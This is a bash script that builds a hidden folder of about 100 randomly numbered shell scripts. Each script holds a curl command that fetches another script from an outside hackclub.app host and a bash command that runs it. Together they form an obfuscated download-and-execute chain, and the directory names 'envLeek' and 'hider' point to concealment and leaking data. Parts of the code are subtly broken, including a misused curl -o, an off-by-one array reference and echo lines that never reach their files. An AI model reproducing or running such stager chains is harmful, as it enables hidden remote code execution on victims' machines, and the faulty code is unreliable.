#!/bin/bash

# Function to generate a unique 6-digit random number
generate_unique_random() {
    local unique=0
    local rand_num
    while [ $unique -eq 0 ]; do
        rand_num=$((100000 + RANDOM % 900000))  # Ensuring the number is 6 digits
        if [[ ! " ${random_numbers[@]} " =~ " ${rand_num} " ]]; then
            unique=1
        fi
    done
    echo $rand_num
}

# Number of unique random numbers to generate
num_random_numbers=100

# Array to store the unique random numbers
random_numbers=()

# Change directory to envLeek/
cd /$HOME/envLeek || exit 1  # Exit if cd fails

# Remove existing hider directory if it exists
rm -rf hider
mkdir hider
cd hider

# Generate unique random numbers and create files
first_rand=$(generate_unique_random)
touch "${first_rand}.sh"  # Create file with the first random number as name
echo "echo 'This is the first random file.' >> ${first_rand}.sh"
echo "curl -o https://project-gliks.v205.hackclub.app/${first_rand}.sh" >> "${first_rand}.sh"
echo "bash ${first_rand}.sh" >> "${first_rand}.sh"

for (( i=1; i<num_random_numbers; i++ )); do
    random_numbers+=($(generate_unique_random))  # Add to array with spaces
    touch "${random_numbers[i]}.sh"  # Create file with the random number as name

    # Add the Curl and Bash commands to the newly made files
    echo "curl -o https://project-gliks.v205.hackclub.app/${random_numbers[i-1]}.sh" >> "${random_numbers[i]}.sh"
    echo "bash ${random_numbers[i-1]}.sh" >> "${random_numbers[i]}.sh"
done

last_rand=$(generate_unique_random)
touch "${last_rand}.sh"  # Create file with the last random number as name
echo "echo 'This is the last random file.' >> ${last_rand}.sh"
echo "curl -o https://project-gliks.v205.hackclub.app/${last_rand}.sh" >> "${last_rand}.sh"
echo "bash ${last_rand}.sh" >> "${last_rand}.sh"
random_numbers+=("${last_rand}")

# Print the generated random numbers
echo "Generated unique 6-digit random numbers: ${random_numbers[@]}"
echo "done"
echo "First random file: ${first_rand}"
echo "Last random file: ${last_rand}"
